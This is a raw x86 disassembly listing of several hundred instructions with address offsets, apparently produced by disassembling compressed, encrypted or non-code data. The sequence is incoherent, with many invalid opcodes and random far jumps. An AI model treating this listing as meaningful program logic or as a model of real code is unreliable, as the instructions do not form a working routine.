  423760:	outs   dx,DWORD PTR ds:[esi]
  423761:	push   ss
  423762:	sbb    edi,DWORD PTR [esi+0x7a]
  423765:	xor    dh,al
  423767:	out    0x2,al
  423769:	lahf   
  42376a:	xchg   edi,eax
  42376b:	out    0xe,eax
  42376d:	push   esi
  42376e:	pusha  
  42376f:	sbb    ah,BYTE PTR [ecx+eiz*4+0x4b]
  423773:	mov    bh,0xfc
  423775:	test   eax,0x1b0430fa
  42377a:	out    0x53,eax
  42377c:	ins    BYTE PTR es:[edi],dx
  42377d:	fdivp  st(0),st
  42377f:	push   ss
  423780:	cmp    al,0xc0
  423782:	cli    
  423783:	xor    esp,DWORD PTR [eax-0x4f]
  423786:	fisttp DWORD PTR [ecx-0x63]
  423789:	iret   
  42378a:	or     al,0xfb
  42378c:	imul   edi,DWORD PTR [ecx+0x157cfea6],0xffffffb7
  423793:	out    0xd1,eax
  423795:	lock gs xchg al,bl
  423799:	mov    ds:0xb325d1c7,al
  42379e:	(bad)  
  4237a0:	pop    esi
  4237a1:	pop    ss
  4237a2:	mov    al,0xbb
  4237a4:	ins    BYTE PTR es:[edi],dx
  4237a5:	pop    edi
  4237a6:	(bad)  
  4237a7:	rcl    DWORD PTR [edi+0x50],cl
  4237aa:	sub    eax,0xbf751bb0
  4237af:	clc    
  4237b0:	in     al,dx
  4237b1:	mov    ds:0x4b58705d,eax
  4237b6:	retf   
  4237b7:	and    DWORD PTR [edx-0x3d3305bf],esp
  4237bd:	(bad)  
  4237be:	sahf   
  4237bf:	adc    DWORD PTR [edx-0x76],ebx
  4237c2:	dec    edx
  4237c3:	jecxz  0x4237a2
  4237c5:	aaa    
  4237c6:	les    ebp,FWORD PTR [ebp+edi*1+0x137a8175]
  4237cd:	fldenv [ecx+0x3a1e537d]
  4237d3:	fidiv  DWORD PTR [ebp+0x60f0a950]
  4237d9:	je     0x423786
  4237db:	mov    eax,ds:0xf192b11e
  4237e0:	mov    dl,0xe8
  4237e2:	fnstenv [eax+0x6058da18]
  4237e8:	and    dl,bh
  4237ea:	jbe    0x423776
  4237ec:	pop    ss
	...
  423855:	add    BYTE PTR [ebx+eiz*1],dh
  423858:	jo     0x4237f7
  42385a:	ja     0x42383b
  42385c:	std    
  42385d:	stos   DWORD PTR es:[edi],eax
  42385e:	(bad)  
  42385f:	sbb    edx,esi
  423861:	jmp    0x7cc1:0x27e105f4
  423868:	add    DWORD PTR [eax],eax
  42386a:	inc    DWORD PTR [eax]
  42386c:	add    BYTE PTR [eax],al
  42386e:	aas    
  42386f:	in     al,dx
  423870:	xchg   ebx,eax
  423871:	sbb    ebx,DWORD PTR [ecx+0x34]
  423874:	(bad)  [ebx+0x59]
  423877:	lahf   
  423878:	or     al,dh
  42387a:	xor    al,0x2d
  42387c:	arpl   bp,di
  42387e:	test   DWORD PTR es:[ebx],esi
  423881:	add    BYTE PTR [ebx],bh
  423883:	ror    DWORD PTR [eax-0x2a],1
  423886:	pop    esp
  423887:	add    ah,dl
  423889:	pop    edi
  42388a:	mov    al,BYTE PTR [eax-0x7b]
  42388d:	fdiv   st,st(1)
  42388f:	lock pop ds
  423891:	cmp    bl,ah
  423893:	xchg   BYTE PTR [ebx],bh
  423895:	imul   eax,DWORD PTR [ecx+0x481a1708],0xab6f45d5
  42389f:	aas    
  4238a0:	mov    eax,0x2bdd8850
  4238a5:	jne    0x423876
  4238a7:	sbb    eax,0xd35506b9
  4238ac:	mov    ds:0x1f69e94e,al
  4238b1:	sub    eax,0x13b99bd9
  4238b6:	test   BYTE PTR [edx],bh
  4238b8:	mov    eax,ds:0x6bd58699
  4238bd:	(bad)  
  4238be:	fs out dx,eax
  4238c0:	adc    eax,DWORD PTR [edi+0x27522213]
  4238c6:	push   cs
  4238c7:	outs   dx,DWORD PTR ds:[esi]
  4238c8:	(bad)  
  4238ca:	addr16 jge 0x4238be
  4238cd:	repnz aaa 
  4238cf:	jle    0x423889
  4238d1:	sbb    al,0x4b
  4238d3:	inc    eax
  4238d4:	imul   DWORD PTR [esi]
  4238d6:	das    
  4238d7:	mov    cl,BYTE PTR [ebx]
  4238d9:	jecxz  0x4238ca
  4238db:	jo     0x423955
  4238dd:	loopne 0x423865
  4238df:	stos   DWORD PTR es:[edi],eax
  4238e0:	outs   dx,BYTE PTR ds:[esi]
  4238e1:	pop    ecx
  4238e2:	mov    eax,0x6784e0a9
  4238e7:	call   0x4f403780
  4238ec:	sub    al,0xa6
  4238ee:	das    
  4238ef:	lock mov ah,0x53
  4238f2:	ret    0x84d0
  4238f5:	jae    0x42390d
  4238f7:	nop
  4238f8:	jno    0x4238ee
  4238fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238fb:	sub    DWORD PTR [eax+0x1c],eax
  4238fe:	sub    esp,ebx
  423900:	(bad)  
  423902:	lea    eax,[ecx-0x50eb100d]
  423908:	jns    0x42394e
  42390a:	cmc    
  42390b:	ror    BYTE PTR [edx+edi*4-0x67],cl
  42390f:	dec    ebx
  423910:	je     0x4238f0
  423912:	aas    
  423913:	in     eax,dx
  423914:	inc    ebx
  423915:	jno    0x4238e8
  423917:	enter  0x3a86,0xe4
  42391b:	and    DWORD PTR [ecx-0x66],edi
  42391e:	pop    es
  42391f:	inc    esi
  423920:	std    
  423921:	fldcw  WORD PTR [ebp+0x71]
  423924:	ja     0x4238b5
  423926:	lea    edi,[ebx]
  423928:	popf   
  423929:	adc    DWORD PTR [edx+ecx*4-0x8],ecx
  42392d:	sbb    eax,0xad1fcc01
  423932:	push   ss
  423933:	dec    edx
  423934:	mov    al,ds:0xc3edff95
  423939:	imul   ebx,DWORD PTR [edx-0x51],0xffffffa5
  42393d:	outs   dx,DWORD PTR ds:[esi]
  42393e:	imul   DWORD PTR ds:0xa7311180
  423944:	mov    cl,0x99
  423946:	sub    eax,ebx
  423948:	mov    dh,0xaf
  42394a:	push   es
  42394b:	adc    BYTE PTR [eax],0xa2
  42394e:	sbb    bh,BYTE PTR [ebx+0x5f329b07]
  423954:	xchg   esi,eax
  423955:	push   0x4
  423957:	aad    0x97
  423959:	mov    DWORD PTR [ecx+ecx*8],edi
  42395c:	pop    ecx
  42395d:	sub    al,0x79
  42395f:	pop    esp
  423960:	sbb    bl,ah
  423962:	push   edi
  423963:	sbb    DWORD PTR [esi],0x57858b3a
  423969:	js     0x42398d
  42396b:	dec    esp
  42396c:	add    eax,0x0
	...
  4239d5:	add    BYTE PTR [edx-0x770e5c],cl
  4239db:	(bad)  
  4239dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239de:	push   ecx
  4239df:	sbb    eax,0x88772bbd
  4239e4:	into   
  4239e5:	jmp    0xff:0x17dc0
  4239ec:	add    BYTE PTR [eax],al
  4239ee:	push   cs
  4239ef:	xor    BYTE PTR [ebp+edx*4+0x6c],ch
  4239f3:	cdq    
  4239f4:	mov    dh,0x1f
  4239f6:	add    dh,al
  4239f8:	and    edi,DWORD PTR [ebx]
  4239fa:	xchg   esp,eax
  4239fb:	jns    0x4239a2
  4239fd:	popf   
  4239fe:	jge    0x4239c5
  423a00:	pop    edi
  423a01:	sahf   
  423a02:	xchg   esi,eax
  423a03:	mov    al,ds:0xdb5f7903
  423a08:	ds xchg ebx,eax
  423a0a:	in     al,dx
  423a0b:	add    BYTE PTR [esi],0x57
  423a0e:	xchg   edi,eax
  423a0f:	push   ecx
  423a10:	dec    ebp
  423a11:	cmc    
  423a12:	mov    ah,0x6f
  423a14:	jbe    0x4239d4
  423a16:	push   ss
  423a17:	sbb    al,0xe3
  423a19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a1a:	test   eax,0x29403c76
  423a1f:	mov    ecx,0xf8316a03
  423a24:	pop    edi
  423a25:	pop    es
  423a26:	mov    ds:0xf83bdb00,eax
  423a2b:	pop    esp
  423a2c:	leave  
  423a2d:	or     ebp,edi
  423a2f:	rcr    DWORD PTR [edx],cl
  423a31:	adc    BYTE PTR [esi],al
  423a33:	xchg   DWORD PTR [edx+eiz*1-0x599b5511],ebx
  423a3a:	add    cl,ch
  423a3c:	xchg   edi,eax
  423a3d:	inc    eax
  423a3e:	jl     0x423a7f
  423a40:	ins    DWORD PTR es:[edi],dx
  423a41:	pop    ecx
  423a42:	inc    edx
  423a43:	(bad)  
  423a44:	repnz rcl DWORD PTR [ebx+edx*2],cl
  423a48:	sbb    BYTE PTR [ecx-0x3ed02544],bh
  423a4e:	mov    eax,ds:0xb31110bd
  423a53:	int3   
  423a54:	in     al,0x97
  423a56:	int3   
  423a57:	jl     0x4239d9
  423a59:	mov    ebp,0x6ab6b5cc
  423a5e:	arpl   WORD PTR [ecx-0x3ba9bf92],si
  423a64:	adc    ecx,ebx
  423a66:	out    dx,al
  423a67:	pop    ss
  423a68:	out    0x93,eax
  423a6a:	fwait
  423a6b:	push   esi
  423a6c:	push   ecx
  423a6d:	mov    ch,0x58
  423a6f:	jl     0x423a2e
  423a71:	cld    
  423a72:	jns    0x423acf
  423a74:	jg     0x423ac8
  423a76:	mov    eax,ds:0x90f20f59
  423a7b:	cwde   
  423a7c:	rcl    BYTE PTR ds:0x14dd6ca2,0x90
  423a83:	lds    ebp,FWORD PTR [eax+0x6351c732]
  423a89:	aad    0x6f
  423a8b:	out    0x7d,eax
  423a8d:	cmp    eax,0x6dc9785c
  423a92:	mov    cl,0x5b
  423a94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a95:	hlt    
  423a96:	push   edx
  423a97:	mov    ch,0xa9
  423a99:	neg    BYTE PTR [eax-0x33bec679]
  423a9f:	(bad)  
  423aa0:	mov    ebp,0x5cd3f438
  423aa5:	fadd   DWORD PTR [ebx-0x3b09c3e6]
  423aab:	call   0xcb28a0cd
  423ab0:	ficomp WORD PTR [edx+0x65c7e632]
  423ab6:	fs adc al,0xf2
  423ab9:	pop    edi
  423aba:	push   ecx
  423abb:	retf   0x1467
  423abe:	sbb    al,0x97
  423ac0:	xchg   BYTE PTR ds:0x97b2c103,bh
  423ac6:	lods   eax,DWORD PTR ds:[esi]
  423ac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ac8:	add    BYTE PTR [ebx],bh
  423aca:	pop    ds
  423acb:	int3   
  423acc:	xchg   ebx,eax
  423acd:	mov    al,ds:0xe83ba640
  423ad2:	test   al,0x80
  423ad4:	push   ss
  423ad5:	imul   ecx,DWORD PTR [eax],0xa80095fa
  423adb:	fisttp QWORD PTR [eax+0x24e64457]
  423ae1:	cld    
  423ae2:	cmc    
  423ae3:	int    0x2e
  423ae5:	inc    ebp
  423ae6:	add    edx,DWORD PTR [ebx+edi*2+0x51]
  423aea:	outs   dx,DWORD PTR ds:[esi]
  423aeb:	inc    edx
  423aec:	dec    ebp
	...
  423b55:	add    BYTE PTR [eax],dh
  423b57:	cmp    eax,0xdf7d9f75
  423b5c:	cli    
  423b5d:	mov    edi,0x60851ed8
  423b62:	shr    DWORD PTR [ebx+0x7ebfd208],cl
  423b68:	add    DWORD PTR [eax],eax
  423b6a:	inc    DWORD PTR [eax]
  423b6c:	add    BYTE PTR [eax],al
  423b6e:	dec    ebp
  423b6f:	jne    0x423bc7
  423b71:	in     al,0x1b
  423b73:	xor    ch,ch
  423b75:	jns    0x423b6c
  423b77:	repz push cs
  423b79:	pop    esi
  423b7a:	fs xchg edx,eax
  423b7c:	and    eax,0xeef6d97c
  423b81:	ficomp WORD PTR ds:0x308789db
  423b87:	pushf  
  423b88:	cmp    al,0xaf
  423b8a:	das    
  423b8b:	lahf   
  423b8c:	jl     0x423c07
  423b8e:	in     eax,dx
  423b8f:	push   0xffffffc7
  423b91:	xchg   ebp,eax
  423b92:	sti    
  423b93:	int3   
  423b94:	and    DWORD PTR [ebx-0x74],eax
  423b97:	das    
  423b98:	sbb    DWORD PTR [ecx],ebp
  423b9a:	or     esi,DWORD PTR [esp+eax*1]
  423b9d:	mov    eax,0x48803739
  423ba2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ba3:	cdq    
  423ba4:	inc    DWORD PTR [esi-0x3e]
  423ba7:	or     eax,0x883392d2
  423bac:	mov    esp,0x85df3e43
  423bb1:	and    eax,eax
  423bb3:	sub    bl,0xbb
  423bb6:	das    
  423bb7:	jl     0x423b57
  423bb9:	shl    DWORD PTR [eax-0x38],cl
  423bbc:	stos   BYTE PTR es:[edi],al
  423bbd:	js     0x423c04
  423bbf:	(bad)  
  423bc0:	sbb    ch,dh
  423bc2:	and    DWORD PTR [eax],0x6b1eac82
  423bc8:	jne    0x423bfb
  423bca:	jb     0x423bed
  423bcc:	mov    ah,0x25
  423bce:	stc    
  423bcf:	or     DWORD PTR [eax],eax
  423bd1:	cmp    ah,BYTE PTR [esp+esi*8+0x57]
  423bd5:	sar    DWORD PTR [ebx+esi*4],1
  423bd8:	jle    0x423c01
  423bda:	jmp    0xb4619ce8
  423bdf:	outs   dx,DWORD PTR ds:[esi]
  423be0:	sbb    ah,BYTE PTR [eax-0x77fc7bd0]
  423be6:	mov    esi,0x980e8cdb
  423beb:	mov    BYTE PTR ds:[esi-0x54],cl
  423bef:	and    BYTE PTR [edi],dh
  423bf1:	lea    edi,[ebx]
  423bf3:	xchg   esp,eax
  423bf4:	les    ebp,FWORD PTR [ebp+0x20]
  423bf7:	dec    edx
  423bf8:	fs call 0x645f:0x709b7b4c
  423c00:	in     al,0xc4
  423c02:	mov    dh,0xf0
  423c04:	(bad)  
  423c05:	call   DWORD PTR [esi-0x5c]
  423c08:	add    al,0x6f
  423c0a:	fstp   DWORD PTR ss:[eax]
  423c0d:	xlat   BYTE PTR ds:[ebx]
  423c0e:	les    edx,FWORD PTR [edx+eax*4]
  423c11:	adc    al,0x81
  423c13:	aam    0x6a
  423c15:	push   cs
  423c16:	inc    esp
  423c17:	clc    
  423c18:	or     edx,DWORD PTR [eax-0x4eae2002]
  423c1e:	pop    ecx
  423c1f:	jb     0x423c13
  423c21:	bound  ebx,QWORD PTR [edi+ebp*8+0x45]
  423c25:	mov    ebx,0x9c94480c
  423c2a:	sti    
  423c2b:	(bad)  
  423c2c:	sub    al,0x1a
  423c2e:	mov    ebx,0x395c947b
  423c33:	jo     0x423be7
  423c35:	pop    ss
  423c36:	cdq    
  423c37:	push   0x3544e12a
  423c3c:	adc    cl,BYTE PTR [ebx+0x2ad0060d]
  423c42:	mov    bh,0x3
  423c44:	mov    ch,0xea
  423c46:	test   al,0x50
  423c48:	call   0x2b031080
  423c4d:	mov    ss,WORD PTR [edi-0x21]
  423c50:	cmp    BYTE PTR fs:[edi+0xd],ch
  423c54:	std    
  423c55:	xchg   DWORD PTR [ecx],esi
  423c57:	dec    ebx
  423c59:	icebp  
  423c5a:	inc    eax
  423c5b:	je     0x423c5c
  423c5d:	jno    0x423c27
  423c5f:	mov    BYTE PTR gs:[eax+0x57c48128],al
  423c66:	adc    eax,0xb70795d0
  423c6b:	(bad)
	...
  423cd3:	add    BYTE PTR [eax],al
  423cd5:	add    ch,bh
  423cd7:	(bad)  
  423cd8:	test   eax,0xff57ab46
  423cdd:	call   FWORD PTR [eax+0x11446617]
  423ce3:	(bad)  
  423ce4:	xor    DWORD PTR [ebx-0x42],ebx
  423ce7:	jg     0x423cea
  423ce9:	add    bh,bh
  423ceb:	add    BYTE PTR [eax],al
  423ced:	add    BYTE PTR [ebx+0x66c6b65b],al
  423cf3:	(bad)  
  423cf4:	icebp  
  423cf5:	mov    bh,0x4e
  423cf7:	out    0xd6,al
  423cf9:	stos   BYTE PTR es:[edi],al
  423cfa:	jmp    0x97f8:0x6cc70bad
  423d01:	in     al,dx
  423d02:	mov    ebx,0x665b3054
  423d07:	lods   al,BYTE PTR ds:[esi]
  423d08:	rep repnz outs dx,DWORD PTR ds:[esi]
  423d0b:	popa   
  423d0c:	gs ss mov dl,0x9f
  423d10:	cmp    edx,DWORD PTR [edx-0xa]
  423d13:	jp     0x423cf9
  423d15:	cwde   
  423d16:	test   BYTE PTR [ebp-0x3b0a783e],dl
  423d1c:	add    esi,DWORD PTR [edx-0x32]
  423d1f:	idiv   al
  423d21:	mov    ch,0x63
  423d23:	jns    0x423d51
  423d25:	push   esp
  423d26:	inc    edx
  423d27:	rcr    DWORD PTR [ecx-0x743893d8],0x57
  423d2e:	mov    ch,0x96
  423d30:	jbe    0x423d09
  423d32:	push   ds
  423d33:	(bad)  
  423d35:	sub    al,0x71
  423d37:	pop    ds
  423d38:	data16 scas al,BYTE PTR es:[edi]
  423d3a:	cmp    DWORD PTR [ecx+edi*1-0x72256e1a],esi
  423d41:	jae    0x423cd3
  423d43:	push   edi
  423d44:	adc    DWORD PTR [edi+0x33],ebx
  423d47:	loope  0x423ce3
  423d49:	xor    dl,BYTE PTR [edx-0x4bcfa22e]
  423d4f:	mov    ebp,0x35b6d497
  423d54:	xchg   edx,eax
  423d55:	xor    BYTE PTR cs:[ebx-0x65f78530],0x69
  423d5d:	or     eax,DWORD PTR ds:0x3f5e4a09
  423d63:	and    ch,BYTE PTR [esi+0x49]
  423d66:	jecxz  0x423d88
  423d68:	jns    0x423d06
  423d6a:	mov    esp,0x51739229
  423d6f:	cli    
  423d70:	sbb    ebp,DWORD PTR [ecx]
  423d72:	or     ch,BYTE PTR [eiz*1+0x1545bd3e]
  423d79:	call   0xd76a:0xe4df71aa
  423d80:	pop    edx
  423d81:	mov    edi,0x5cdba586
  423d86:	lahf   
  423d87:	in     al,dx
  423d88:	pop    eax
  423d89:	mov    edi,ebx
  423d8b:	push   ds
  423d8c:	dec    DWORD PTR [edx+eax*2]
  423d8f:	test   al,0x17
  423d91:	pop    esp
  423d92:	pop    esp
  423d93:	dec    ebp
  423d94:	loope  0x423de9
  423d96:	mov    ecx,0x18ca3f45
  423d9b:	jnp    0x423da9
  423d9d:	mov    ebx,0x371b8cf0
  423da2:	cs pop es
  423da4:	add    esi,DWORD PTR [esi-0x31b854f3]
  423daa:	jmp    DWORD PTR [edi+0x64ca49bd]
  423db0:	mov    esi,0x60ed8eb5
  423db5:	jmp    0xab6:0x751d511a
  423dbc:	call   0xd16a:0x6ab45aa8
  423dc3:	push   es
  423dc4:	loope  0x423d87
  423dc6:	add    DWORD PTR [edi+0x7d34b361],esp
  423dcc:	popf   
  423dcd:	jbe    0x423e48
  423dcf:	add    esi,DWORD PTR [esp+esi*4+0x546cccd5]
  423dd6:	cmp    eax,0x5c46e539
  423ddb:	mov    ah,0x2a
  423ddd:	retf   0x8c44
  423de0:	sti    
  423de1:	xlat   BYTE PTR ds:[ebx]
  423de2:	loope  0x423e30
  423de4:	cmp    BYTE PTR [esi],0xd4
  423de7:	lods   eax,DWORD PTR ds:[esi]
  423de8:	xchg   si,ax
  423dea:	lods   eax,DWORD PTR ds:[esi]
  423deb:	sub    bh,BYTE PTR [edx]
	...
  423e55:	add    BYTE PTR [edx-0xa],ah
  423e58:	xchg   DWORD PTR [ecx],ecx
  423e5a:	xchg   edi,eax
  423e5b:	jns    0x423e4b
  423e5d:	jmp    DWORD PTR [edi]
  423e5f:	mov    DWORD PTR [eax+0x28252ad2],esp
  423e65:	cmp    bh,BYTE PTR [ebp-0xfffe80]
  423e6b:	add    BYTE PTR [eax],al
  423e6d:	add    BYTE PTR [ecx+0x32],dh
  423e70:	test   eax,0x1af4019a
  423e75:	loop   0x423e86
  423e77:	sbb    BYTE PTR [edi-0x2ae89090],cl
  423e7d:	outs   dx,BYTE PTR ds:[esi]
  423e7e:	(bad)  
  423e7f:	loop   0x423efe
  423e81:	and    BYTE PTR [edx],0xa8
  423e84:	mov    dh,0x5d
  423e86:	push   esp
  423e87:	sahf   
  423e88:	cmp    eax,0xd0fd1f5a
  423e8d:	mov    DWORD PTR ds:0x9a05b411,esp
  423e93:	inc    edi
  423e94:	mov    WORD PTR [ecx+0x59],ss
  423e97:	das    
  423e98:	add    edi,eax
  423e9a:	jge    0x423e46
  423e9c:	ja     0x423e3a
  423e9e:	das    
  423e9f:	idiv   ebp
  423ea1:	loop   0x423ed9
  423ea3:	lea    ebp,[ecx+0x15]
  423ea6:	iret   
  423ea7:	xor    eax,0x368291f7
  423eac:	mov    DWORD PTR [ecx],ebp
  423eae:	out    0xdd,eax
  423eb0:	mov    al,0x1f
  423eb2:	mov    ch,0xe9
  423eb4:	std    
  423eb5:	push   ss
  423eb6:	add    ebx,DWORD PTR [eax-0x7b]
  423eb9:	test   edx,ecx
  423ebb:	pop    ss
  423ebc:	icebp  
  423ebd:	mov    WORD PTR [ecx-0x39b8575e],cs
  423ec3:	adc    eax,0x6456a2fe
  423ec8:	out    0x98,al
  423eca:	mov    ebp,esp
  423ecc:	retf   
  423ecd:	fld    DWORD PTR [esi+0x77]
  423ed0:	push   0x72ec2daa
  423ed5:	jno    0x423e73
  423ed7:	xor    BYTE PTR [ebx+0x4be2de14],bh
  423edd:	adc    edx,esp
  423edf:	fidiv  DWORD PTR [edi+0x596a8294]
  423ee5:	cdq    
  423ee6:	dec    ebp
  423ee7:	leave  
  423ee8:	adc    eax,0xebca6772
  423eed:	stos   DWORD PTR es:[edi],eax
  423eee:	inc    ebx
  423eef:	inc    esi
  423ef0:	rcl    DWORD PTR [ebx+0x32],1
  423ef3:	or     al,0x61
  423ef5:	push   eax
  423ef6:	into   
  423ef7:	stos   BYTE PTR es:[edi],al
  423ef8:	or     ebp,0xd6687b94
  423efe:	fnsave [edi-0x59]
  423f01:	arpl   WORD PTR [edx-0x1c24fc00],bp
  423f07:	mov    dl,0x8d
  423f09:	jno    0x423f4c
  423f0b:	out    0x3c,al
  423f0d:	push   ebx
  423f0e:	adc    ah,0x63
  423f11:	out    dx,al
  423f12:	mov    eax,ds:0x2b81431b
  423f17:	(bad)  
  423f18:	or     eax,0xef9a0334
  423f1d:	mov    ch,0x60
  423f1f:	out    0xb6,al
  423f21:	imul   ecx,DWORD PTR [edi],0xffffffdd
  423f24:	jle    0x423f4e
  423f26:	(bad)  
  423f27:	icebp  
  423f28:	test   al,0x1d
  423f2a:	push   0xf3732bef
  423f2f:	cs push 0x7ebac28a
  423f35:	sbb    eax,eax
  423f37:	mov    al,ds:0x30685ed2
  423f3c:	inc    esp
  423f3d:	cdq    
  423f3e:	mov    gs,WORD PTR [esi+eax*1+0x26c6b444]
  423f45:	jne    0x423f1e
  423f47:	lods   eax,DWORD PTR ds:[esi]
  423f48:	push   edx
  423f49:	dec    ecx
  423f4a:	rep ins DWORD PTR es:[edi],dx
  423f4c:	js     0x423f9f
  423f4e:	inc    ebp
  423f4f:	aam    0xca
  423f51:	jno    0x423efe
  423f53:	lahf   
  423f54:	loop   0x423f33
  423f56:	stos   DWORD PTR es:[edi],eax
  423f57:	outs   dx,BYTE PTR ds:[esi]
  423f58:	rcr    DWORD PTR [edx+0x688d3ea],1
  423f5e:	inc    eax
  423f5f:	fisub  DWORD PTR [eax+eax*1]
  423f62:	lds    edi,FWORD PTR cs:[eax]
  423f65:	and    al,0x39
  423f67:	lods   eax,DWORD PTR ds:[esi]
  423f68:	stos   BYTE PTR es:[edi],al
  423f69:	fistp  WORD PTR [ebx+0x6e]
  423f6c:	push   ss
	...
  423fd5:	add    BYTE PTR [esi+0x74b9649a],ch
  423fdb:	(bad)  
  423fdc:	call   FWORD PTR [edi-0x26e369ec]
  423fe2:	test   eax,0xbc772db6
  423fe7:	add    DWORD PTR [ecx],0xff00
  423fed:	add    BYTE PTR [ecx],al
  423fef:	or     edi,ebx
  423ff1:	dec    edx
  423ff2:	inc    BYTE PTR [edx]
  423ff4:	enter  0x2bcc,0xea
  423ff8:	inc    ebx
  423ff9:	sub    BYTE PTR [ecx],0x51
  423ffc:	ins    DWORD PTR es:[edi],dx
  423ffd:	mov    bh,0xf3
  423fff:	shr    BYTE PTR [esp+ebx*1-0x1c0f2314],cl
  424006:	(bad)  
  424007:	pop    edx
  424008:	jmp    0xec92:0xbb75952a
  42400f:	dec    ebx
  424010:	jb     0x424076
  424012:	mov    eax,0x929f5549
  424017:	jp     0x423fc9
  424019:	std    
  42401a:	pop    edi
  42401b:	mov    bl,0xbf
  42401d:	out    0x97,eax
  42401f:	or     BYTE PTR [eax-0x20],al
  424022:	mov    fs,WORD PTR [edi-0xcaf8792]
  424028:	call   DWORD PTR [edi-0x5c]
  42402b:	and    al,ch
  42402d:	adc    eax,0x17ad0966
  424032:	icebp  
  424033:	int3   
  424034:	jle    0x42400a
  424036:	xor    al,0x54
  424038:	add    al,0xbc
  42403a:	sub    ah,BYTE PTR [ecx+0x1285f0fe]
  424040:	mov    dh,0xab
  424042:	aas    
  424043:	mov    esp,0xb3e666af
  424048:	cmp    DWORD PTR [ebx],ecx
  42404a:	mov    eax,0x2fe03050
  42404f:	pop    ss
  424050:	push   ecx
  424051:	inc    edi
  424052:	loopne 0x42406e
  424054:	xor    al,0x2b
  424056:	cmp    BYTE PTR [ecx-0x10bb404d],dl
  42405c:	xchg   edi,eax
  42405d:	repz mov ebp,0x5e43a9ff
  424063:	pop    edi
  424064:	push   cs
  424065:	dec    edx
  424066:	lock or al,0xa5
  424069:	ret    
  42406a:	mov    dh,0xdd
  42406c:	pushf  
  42406d:	xchg   ebp,eax
  42406e:	push   esp
  42406f:	call   0x504d:0x65d00968
  424076:	or     BYTE PTR [esi],dh
  424078:	es pop ds
  42407a:	mov    dh,0x78
  42407c:	lods   eax,DWORD PTR ds:[esi]
  42407d:	jge    0x424029
  42407f:	jl     0x4240bf
  424081:	jmp    0x2988:0x1c0c29cd
  424088:	adc    cl,BYTE PTR [ecx+eiz*1-0x60]
  42408c:	in     eax,0xae
  42408e:	sbb    al,0xb8
  424090:	fwait
  424091:	jnp    0x424035
  424093:	sbb    DWORD PTR [ebx],ebp
  424095:	pop    ebp
  424096:	jge    0x4240fb
  424098:	jb     0x4240c9
  42409a:	and    al,0x35
  42409c:	in     eax,0x24
  42409e:	xchg   edi,eax
  42409f:	pop    DWORD PTR [esp+ebp*8]
  4240a2:	or     edx,ebp
  4240a4:	mov    ebx,0x20cfd891
  4240a9:	mov    ds:0xa99c9087,al
  4240ae:	pop    edx
  4240af:	sbb    BYTE PTR [edi+0x19],bl
  4240b2:	adc    ebp,DWORD PTR ds:0xe96cf8e4
  4240b8:	dec    esp
  4240b9:	js     0x42409b
  4240bb:	aad    0x3c
  4240bd:	adc    al,0x5b
  4240bf:	mov    bh,0x53
  4240c1:	int    0xae
  4240c3:	ss mov ebp,0x4d549a26
  4240c9:	(bad)  
  4240ca:	xchg   edx,eax
  4240cb:	(bad)  
  4240cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4240cd:	icebp  
  4240ce:	daa    
  4240cf:	push   ebp
  4240d0:	adc    al,0x7e
  4240d2:	sbb    eax,0x8cb495d7
  4240d7:	jno    0x4240c0
  4240d9:	xor    al,al
  4240db:	popf   
  4240dc:	mov    esp,0xbcc0f8b4
  4240e1:	xchg   BYTE PTR ds:0xa39ff8a2,bl
  4240e7:	xor    eax,ebp
  4240e9:	adc    eax,0xbb181a
	...
  424156:	jl     0x4241b0
  424158:	cs mov cl,0x2e
  42415b:	idiv   edi
  42415d:	(bad)  
  42415f:	jne    0x424128
  424161:	iret   
  424162:	jne    0x42417d
  424164:	mov    ds:0x182bb16,eax
  424169:	add    bh,bh
  42416b:	add    BYTE PTR [eax],al
  42416d:	add    BYTE PTR [edx-0x7617a631],al
  424173:	cmp    dh,BYTE PTR [edx+ebx*1+0x6ce70d69]
  42417a:	xchg   edx,eax
  42417b:	imul   esi,ebx,0x6d9fb7a1
  424181:	dec    esi
  424182:	jp     0x4241f3
  424184:	(bad)  
  424185:	dec    edx
  424186:	jl     0x424143
  424188:	mov    ebx,0x13e5c48b
  42418d:	dec    edi
  42418e:	sar    ch,0xa8
  424191:	mov    ds,ebp
  424193:	mov    ds:0xa90bb37a,al
  424198:	in     eax,dx
  424199:	mov    esp,0xdffe9b61
  42419e:	nop
  42419f:	rcr    DWORD PTR [edx],0xf7
  4241a2:	ret    
  4241a3:	das    
  4241a4:	imul   ebp
  4241a6:	int    0x57
  4241a8:	test   DWORD PTR [eax-0x3],0x5604746f
  4241af:	xchg   BYTE PTR [esi],ah
  4241b1:	jle    0x4241d5
  4241b3:	dec    ebp
  4241b4:	jmp    0xd00a4393
  4241b9:	loopne 0x424226
  4241bb:	inc    ebp
  4241bc:	cld    
  4241bd:	shr    BYTE PTR [edi+0x199dddd6],cl
  4241c3:	aam    0xea
  4241c5:	mov    fs,esp
  4241c7:	fisttp DWORD PTR [ecx]
  4241c9:	es test al,0x68
  4241cc:	je     0x424209
  4241ce:	mov    ds:0xf564bf3e,eax
  4241d3:	ins    BYTE PTR es:[edi],dx
  4241d4:	ror    DWORD PTR [ebx+0x6a21e3a5],0x41
  4241db:	sub    ch,BYTE PTR [esi]
  4241dd:	jle    0x424216
  4241df:	shr    BYTE PTR [ebx-0x136744ba],cl
  4241e5:	xchg   ecx,eax
  4241e6:	cwde   
  4241e7:	out    dx,eax
  4241e8:	jecxz  0x424210
  4241ea:	fst    DWORD PTR [ebx-0x68]
  4241ed:	push   edi
  4241ee:	adc    al,0xc6
  4241f1:	pop    ds
  4241f2:	cli    
  4241f3:	cmovns ebx,DWORD PTR [ecx]
  4241f6:	outs   dx,DWORD PTR ds:[esi]
  4241f7:	iret   
  4241f8:	shl    BYTE PTR [ecx+ebx*8+0x1cd5a38b],0x77
  424200:	ja     0x424262
  424202:	imul   edi,DWORD PTR [edi-0x1c],0x7b991efa
  424209:	sbb    BYTE PTR [ebx+ebp*8],ah
  42420c:	neg    DWORD PTR [edi-0x55b36e17]
  424212:	std    
  424213:	xlat   BYTE PTR ds:[ebx]
  424214:	push   ss
  424215:	rcr    BYTE PTR [ebp+0x4c],cl
  424218:	push   esp
  424219:	fwait
